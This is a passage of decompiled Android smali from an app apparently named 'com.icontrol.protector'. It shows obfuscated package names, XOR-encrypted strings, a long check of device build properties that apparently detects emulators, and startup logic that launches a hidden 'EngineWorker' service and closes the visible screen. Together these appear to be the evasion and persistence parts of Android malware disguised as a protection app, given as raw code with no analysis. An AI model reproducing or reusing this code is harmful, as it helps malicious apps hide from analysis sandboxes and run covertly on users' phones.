    sget-object v0, Landroid/os/Build;->DEVICE:Ljava/lang/String;

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v4, v3, [B

    fill-array-data v4, :array_3

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    :cond_0
    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;

    new-array v2, v1, [B

    fill-array-data v2, :array_4

    new-array v4, v3, [B

    fill-array-data v4, :array_5

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_2

    new-array v2, v1, [B

    fill-array-data v2, :array_6

    new-array v4, v3, [B

    fill-array-data v4, :array_7

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->HARDWARE:Ljava/lang/String;

    new-array v2, v3, [B

    fill-array-data v2, :array_8

    new-array v4, v3, [B

    fill-array-data v4, :array_9

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_2

    const/4 v2, 0x6

    new-array v2, v2, [B

    fill-array-data v2, :array_a

    new-array v4, v3, [B

    fill-array-data v4, :array_b

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    const/16 v2, 0xa

    new-array v4, v2, [B

    fill-array-data v4, :array_c

    new-array v5, v3, [B

    fill-array-data v5, :array_d

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    new-array v4, v3, [B

    fill-array-data v4, :array_e

    new-array v5, v3, [B

    fill-array-data v5, :array_f

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    const/16 v4, 0x19

    new-array v4, v4, [B

    fill-array-data v4, :array_10

    new-array v5, v3, [B

    fill-array-data v5, :array_11

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    new-array v4, v2, [B

    fill-array-data v4, :array_12

    new-array v5, v3, [B

    fill-array-data v5, :array_13

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    new-array v4, v2, [B

    fill-array-data v4, :array_14

    new-array v5, v3, [B

    fill-array-data v5, :array_15

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    new-array v2, v2, [B

    fill-array-data v2, :array_16

    new-array v4, v3, [B

    fill-array-data v4, :array_17

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_2

    const/4 v2, 0x3

    new-array v2, v2, [B

    fill-array-data v2, :array_18

    new-array v4, v3, [B

    fill-array-data v4, :array_19

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_2

    new-array v2, v1, [B

    fill-array-data v2, :array_1a

    new-array v4, v3, [B

    fill-array-data v4, :array_1b

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_2

    const/16 v2, 0x12

    new-array v2, v2, [B

    fill-array-data v2, :array_1c

    new-array v4, v3, [B

    fill-array-data v4, :array_1d

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_2

    new-array v1, v1, [B

    fill-array-data v1, :array_1e

    new-array v2, v3, [B

    fill-array-data v2, :array_1f

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_2

    new-array v1, v3, [B

    fill-array-data v1, :array_20

    new-array v2, v3, [B

    fill-array-data v2, :array_21

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_2

    const/16 v1, 0x9

    new-array v1, v1, [B

    fill-array-data v1, :array_22

    new-array v2, v3, [B

    fill-array-data v2, :array_23

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    goto :goto_0

    :cond_1
    const/4 v0, 0x0

    goto :goto_1

    :cond_2
    :goto_0
    const/4 v0, 0x1

    :goto_1
    return v0

    :array_0
    .array-data 1
        0x53t
        0x1t
        -0xat
        0x46t
        -0x3ft
        0x10t
        -0x49t
    .end array-data

    :array_1
    .array-data 1
        0x34t
        0x64t
        -0x68t
        0x23t
        -0x4dt
        0x79t
        -0x2ct
        0x2bt
    .end array-data

    :array_2
    .array-data 1
        -0x50t
        -0x1et
        -0x74t
        0x5et
        -0x18t
        0x36t
        0x4at
    .end array-data

    :array_3
    .array-data 1
        -0x29t
        -0x79t
        -0x1et
        0x3bt
        -0x66t
        0x5ft
        0x29t
        0x54t
    .end array-data

    :array_4
    .array-data 1
        -0x68t
        -0x28t
        0x0t
        0x7et
        0x39t
        0x15t
        0x22t
    .end array-data

    :array_5
    .array-data 1
        -0x1t
        -0x43t
        0x6et
        0x1bt
        0x4bt
        0x7ct
        0x41t
        0x73t
    .end array-data

    :array_6
    .array-data 1
        0x69t
        0x23t
        -0x2ct
        -0x3ft
        0x60t
        -0x1bt
        -0x53t
    .end array-data

    :array_7
    .array-data 1
        0x1ct
        0x4dt
        -0x41t
        -0x51t
        0xft
        -0x6et
        -0x3dt
        0x1t
    .end array-data

    :array_8
    .array-data 1
        0x4ft
        0x65t
        -0x19t
        -0x53t
        -0x7bt
        -0x71t
        0x16t
        -0x67t
    .end array-data

    :array_9
    .array-data 1
        0x28t
        0xat
        -0x75t
        -0x37t
        -0x1dt
        -0x1at
        0x65t
        -0xft
    .end array-data

    :array_a
    .array-data 1
        0x4at
        -0x5at
        -0x5et
        0x64t
        0x73t
        0x4et
    .end array-data

    nop

    :array_b
    .array-data 1
        0x38t
        -0x39t
        -0x34t
        0x7t
        0x1bt
        0x3bt
        0x75t
        0x33t
    .end array-data

    :array_c
    .array-data 1
        -0x1at
        -0x45t
        0x4ft
        0x79t
        0x51t
        -0x7ct
        -0x62t
        0x39t
        -0x1bt
        -0x41t
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x7ft
        -0x2ct
        0x20t
        0x1et
        0x3dt
        -0x1ft
        -0x3ft
        0x4at
    .end array-data

    :array_e
    .array-data 1
        -0x4at
        0x2t
        -0x12t
        0x7t
        0x64t
        0x6at
        -0x55t
        -0x2dt
    .end array-data

    :array_f
    .array-data 1
        -0xdt
        0x6ft
        -0x65t
        0x6bt
        0x5t
        0x1et
        -0x3ct
        -0x5ft
    .end array-data

    :array_10
    .array-data 1
        0x73t
        -0x24t
        0x35t
        -0x22t
        0x27t
        0x1et
        0x58t
        -0x22t
        0x61t
        -0xat
        0x1at
        -0x74t
        0x2at
        0x2t
        0x55t
        -0x6et
        0x46t
        -0x6et
        0x37t
        -0x3dt
        0x3at
        0x57t
        0x44t
        -0x3at
        0x4t
    .end array-data

    nop

    :array_11
    .array-data 1
        0x32t
        -0x4et
        0x51t
        -0x54t
        0x48t
        0x77t
        0x3ct
        -0x2t
    .end array-data

    :array_12
    .array-data 1
        0x4et
        -0x51t
        -0x48t
        -0x47t
        -0x7dt
        0x68t
        0x64t
        0x32t
        0x66t
        -0x5ct
    .end array-data

    nop

    :array_13
    .array-data 1
        0x9t
        -0x36t
        -0x2at
        -0x40t
        -0x12t
        0x7t
        0x10t
        0x5bt
    .end array-data

    :array_14
    .array-data 1
        -0x48t
        -0x72t
        -0x9t
        -0x8t
        -0x2ft
        0x2et
        -0x4ct
        0x45t
        -0x59t
        -0x71t
    .end array-data

    nop

    :array_15
    .array-data 1
        -0x35t
        -0x16t
        -0x64t
        -0x59t
        -0x4at
        0x41t
        -0x25t
        0x22t
    .end array-data

    :array_16
    .array-data 1
        0x4t
        0x1dt
        -0x25t
        -0x27t
        -0xat
        0x6bt
        0x7t
        0x1et
        0x7t
        0x19t
    .end array-data

    nop

    :array_17
    .array-data 1
        0x63t
        0x72t
        -0x4ct
        -0x42t
        -0x66t
        0xet
        0x58t
        0x6dt
    .end array-data

    :array_18
    .array-data 1
        -0x63t
        0x48t
        0x5bt
    .end array-data

    :array_19
    .array-data 1
        -0x12t
        0x2ct
        0x30t
        -0x27t
        -0x28t
        -0x59t
        0x1at
        0x29t
    .end array-data

    :array_1a
    .array-data 1
        0x55t
        -0x6t
        -0x40t
        0x77t
        0x4bt
        -0x76t
        -0x5ft
    .end array-data

    :array_1b
    .array-data 1
        0x26t
        -0x62t
        -0x55t
        0x28t
        0x33t
        -0x4et
        -0x69t
        -0x70t
    .end array-data

    :array_1c
    .array-data 1
        0x3at
        -0x10t
        0x1t
        -0x1at
        0x46t
        0x4dt
        0x5t
        -0x6ct
        0x27t
        -0xft
        0x5ct
        -0x73t
        0x7et
        0x5ct
        0x1ft
        -0x6at
        0x7ft
        -0x60t
    .end array-data

    nop

    :array_1d
    .array-data 1
        0x49t
        -0x6ct
        0x6at
        -0x47t
        0x21t
        0x3dt
        0x6dt
        -0x5t
    .end array-data

    :array_1e
    .array-data 1
        -0xat
        -0x6at
        -0x53t
        -0x34t
        -0x3et
        0x5dt
        -0xet
    .end array-data

    :array_1f
    .array-data 1
        -0x80t
        -0xct
        -0x3et
        -0x4ct
        -0x6t
        0x6bt
        -0x7et
        0x10t
    .end array-data

    :array_20
    .array-data 1
        0x61t
        -0x70t
        -0x18t
        0x61t
        0x69t
        0x22t
        -0x5et
        0x55t
    .end array-data

    :array_21
    .array-data 1
        0x4t
        -0x3t
        -0x63t
        0xdt
        0x8t
        0x56t
        -0x33t
        0x27t
    .end array-data

    :array_22
    .array-data 1
        -0x6at
        0x21t
        -0x77t
        -0x64t
        -0x2bt
        0x60t
        -0x55t
        0x31t
        -0x69t
    .end array-data

    nop

    :array_23
    .array-data 1
        -0x1bt
        0x48t
        -0x1ct
        -0x17t
        -0x47t
        0x1t
        -0x21t
        0x5et
    .end array-data
.end method

.method public static i(Landroid/content/Context;)Z
    .locals 2

    .line 1
    const/16 v0, 0xc

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/net/ConnectivityManager;

    invoke-virtual {p0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object p0

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result p0

    if-eqz p0, :cond_0

    const/4 p0, 0x1

    return p0

    :cond_0
    const/4 p0, 0x0

    return p0

    :array_0
    .array-data 1
        0x3bt
        0x3at
        -0x14t
        -0x24t
        0x45t
        -0x70t
        0x62t
        -0xct
        0x2et
        0x3ct
        -0xat
        -0x35t
    .end array-data

    :array_1
    .array-data 1
        0x58t
        0x55t
        -0x7et
        -0x4et
        0x20t
        -0xdt
        0x16t
        -0x63t
    .end array-data
.end method

.method private synthetic j(Landroid/content/DialogInterface;I)V
    .locals 0

    .line 1
    invoke-virtual {p0}, Lcom/icontrol/protector/ActivMain;->finish()V

    const/4 p1, 0x0

    invoke-static {p1}, Ljava/lang/System;->exit(I)V

    return-void
.end method

.method private synthetic k(Landroid/content/Context;)V
    .locals 4

    .line 1
    invoke-direct {p0, p1}, Lcom/icontrol/protector/ActivMain;->l(Landroid/content/Context;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3a98

    add-long/2addr v0, v2

    const-class v2, Lcom/icontrol/protector/EngineWorker;

    invoke-static {p1, v2, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/y1;->b(Landroid/content/Context;Ljava/lang/Class;J)V

    return-void
.end method

.method private l(Landroid/content/Context;)V
    .locals 2

    .line 1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/icontrol/protector/ActivMain$d;

    invoke-direct {v1, p0, p1}, Lcom/icontrol/protector/ActivMain$d;-><init>(Lcom/icontrol/protector/ActivMain;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 5

    invoke-super {p0}, Landroid/app/Activity;->finish()V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const/4 v1, 0x0

    sput-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    new-instance v1, Landroid/os/Handler;

    invoke-direct {v1}, Landroid/os/Handler;-><init>()V

    new-instance v2, Lntidisestablish/neumonoul/floccinaucinih/q1;

    invoke-direct {v2, p0, v0}, Lntidisestablish/neumonoul/floccinaucinih/q1;-><init>(Lcom/icontrol/protector/ActivMain;Landroid/content/Context;)V

    const-wide/16 v3, 0x3e9

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1

    const/4 v0, 0x1

    if-ne p1, v0, :cond_2

    iget-object p1, p0, Lcom/icontrol/protector/ActivMain;->b:Landroid/webkit/ValueCallback;

    if-eqz p1, :cond_2

    if-eqz p3, :cond_2

    const/4 p1, -0x1

    if-eq p2, p1, :cond_0

    goto :goto_1

    :cond_0
    invoke-virtual {p3}, Landroid/content/Intent;->getDataString()Ljava/lang/String;

    move-result-object p1

    const/4 p2, 0x0

    if-eqz p1, :cond_1

    new-array p3, v0, [Landroid/net/Uri;

    const/4 v0, 0x0

    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p1

    aput-object p1, p3, v0

    goto :goto_0

    :cond_1
    move-object p3, p2

    :goto_0
    iget-object p1, p0, Lcom/icontrol/protector/ActivMain;->b:Landroid/webkit/ValueCallback;

    invoke-interface {p1, p3}, Landroid/webkit/ValueCallback;->onReceiveValue(Ljava/lang/Object;)V

    iput-object p2, p0, Lcom/icontrol/protector/ActivMain;->b:Landroid/webkit/ValueCallback;

    nop

    :cond_2
    :goto_1
    return-void
.end method

.method public onBackPressed()V
    .locals 1

    :try_start_0
    sget-object v0, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/webkit/WebView;->canGoBack()Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->goBack()V

    goto :goto_0

    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 9

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/y9;->a()Lntidisestablish/neumonoul/floccinaucinih/y9;

    move-result-object p1

    const/16 v0, 0x8

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    sget-object v2, Lcom/icontrol/protector/My_Configs;->ALL_CONFIG:Ljava/lang/String;

    invoke-virtual {p1, v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/y9;->b(Landroid/content/Context;Ljava/lang/String;)V

    invoke-direct {p0}, Lcom/icontrol/protector/ActivMain;->g()V

    new-instance v1, Landroid/graphics/Point;

    invoke-direct {v1}, Landroid/graphics/Point;-><init>()V

    invoke-virtual {p0}, Landroid/app/Activity;->getWindowManager()Landroid/view/WindowManager;

    move-result-object v2

    invoke-interface {v2}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v2

    invoke-virtual {v2, v1}, Landroid/view/Display;->getRealSize(Landroid/graphics/Point;)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const/4 v3, 0x4

    new-array v4, v3, [B

    fill-array-data v4, :array_0

    new-array v5, v0, [B

    fill-array-data v5, :array_1

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    iget v5, v1, Landroid/graphics/Point;->x:I

    invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->e(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    new-array v3, v3, [B

    fill-array-data v3, :array_2

    new-array v4, v0, [B

    fill-array-data v4, :array_3

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    iget v1, v1, Landroid/graphics/Point;->y:I

    invoke-static {v1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v3, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->e(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    sget-object v1, Lcom/icontrol/protector/My_Configs;->Anti_emulator:Ljava/lang/String;

    const/4 v2, 0x1

    new-array v3, v2, [B

    const/16 v4, -0x48

    const/4 v5, 0x0

    aput-byte v4, v3, v5

    new-array v4, v0, [B

    fill-array-data v4, :array_4

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-direct {p0}, Lcom/icontrol/protector/ActivMain;->h()Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-direct {p0}, Lcom/icontrol/protector/ActivMain;->c()V

    return-void

    :cond_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lcom/icontrol/protector/ActivMain;->i(Landroid/content/Context;)Z

    move-result v1

    const/4 v3, -0x1

    const/4 v4, 0x3

    const/4 v6, 0x2

    if-nez v1, :cond_a

    sget p1, Lntidisestablish/neumonoul/floccinaucinih/xv;->c:I

    invoke-virtual {p0, p1}, Landroid/app/Activity;->setContentView(I)V

    sget p1, Lntidisestablish/neumonoul/floccinaucinih/uv;->h:I

    invoke-virtual {p0, p1}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/TextView;

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v7

    const/16 v8, 0xc31

    if-eq v7, v8, :cond_4

    const/16 v8, 0xca9

    if-eq v7, v8, :cond_3

    const/16 v5, 0xe7e

    if-eq v7, v5, :cond_2

    const/16 v5, 0xf2e

    if-eq v7, v5, :cond_1

    goto :goto_1

    :cond_1
    new-array v5, v6, [B

    fill-array-data v5, :array_5

    new-array v7, v0, [B

    fill-array-data v7, :array_6

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_5

    move v5, v6

    goto :goto_2

    :cond_2
    new-array v5, v6, [B

    fill-array-data v5, :array_7

    new-array v7, v0, [B

    fill-array-data v7, :array_8

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_5

    move v5, v4

    goto :goto_2

    :cond_3
    new-array v7, v6, [B

    fill-array-data v7, :array_9

    new-array v8, v0, [B

    fill-array-data v8, :array_a

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v1, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_5

    goto :goto_2

    :cond_4
    new-array v5, v6, [B

    fill-array-data v5, :array_b

    new-array v7, v0, [B

    fill-array-data v7, :array_c

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_5

    move v5, v2

    goto :goto_2

    :cond_5
    :goto_1
    move v5, v3

    :goto_2
    const/16 v1, 0x4b

    if-eqz v5, :cond_9

    if-eq v5, v2, :cond_8

    if-eq v5, v6, :cond_7

    if-eq v5, v4, :cond_6

    new-array v1, v1, [B

    fill-array-data v1, :array_d

    new-array v0, v0, [B

    fill-array-data v0, :array_e

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    :goto_3
    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_4

    :cond_6
    const/16 v1, 0x56

    new-array v1, v1, [B

    fill-array-data v1, :array_f

    new-array v0, v0, [B

    fill-array-data v0, :array_10

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_3

    :cond_7
    const/16 v1, 0x41

    new-array v1, v1, [B

    fill-array-data v1, :array_11

    new-array v0, v0, [B

    fill-array-data v0, :array_12

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_3

    :cond_8
    const/16 v1, 0x8f

    new-array v1, v1, [B

    fill-array-data v1, :array_13

    new-array v0, v0, [B

    fill-array-data v0, :array_14

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_3

    :cond_9
    new-array v1, v1, [B

    fill-array-data v1, :array_15

    new-array v0, v0, [B

    fill-array-data v0, :array_16

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_3

    :goto_4
    sget p1, Lntidisestablish/neumonoul/floccinaucinih/uv;->i:I

    invoke-virtual {p0, p1}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/ImageView;

    iget-object v0, p0, Lcom/icontrol/protector/ActivMain;->d:Landroid/view/View$OnClickListener;

    invoke-virtual {p1, v0}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    sget p1, Lntidisestablish/neumonoul/floccinaucinih/uv;->e:I

    invoke-virtual {p0, p1}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/Button;

    iget-object v0, p0, Lcom/icontrol/protector/ActivMain;->c:Landroid/view/View$OnClickListener;

    invoke-virtual {p1, v0}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    goto/16 :goto_7

    :cond_a
    :try_start_1
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v1

    const/high16 v7, 0x1000000

    invoke-virtual {v1, v7, v7}, Landroid/view/Window;->setFlags(II)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    sget-object v1, Lcom/icontrol/protector/My_Configs;->Is_Store:Ljava/lang/String;

    new-array v7, v2, [B

    const/16 v8, -0x35

    aput-byte v8, v7, v5

    new-array v8, v0, [B

    fill-array-data v8, :array_17

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v1, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_d

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/icontrol/protector/EngineWorker;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/q8;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v1

    if-nez v1, :cond_c

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_b

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/p1;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_5

    :cond_b
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_c
    :goto_5
    invoke-virtual {p0}, Lcom/icontrol/protector/ActivMain;->finish()V

    return-void

    :cond_d
    sget v1, Lntidisestablish/neumonoul/floccinaucinih/xv;->b:I

    invoke-virtual {p0, v1}, Landroid/app/Activity;->setContentView(I)V

    sget v1, Lntidisestablish/neumonoul/floccinaucinih/uv;->a:I

    invoke-virtual {p0, v1}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/webkit/WebView;

    sput-object v1, Lcom/icontrol/protector/ActivMain;->f:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

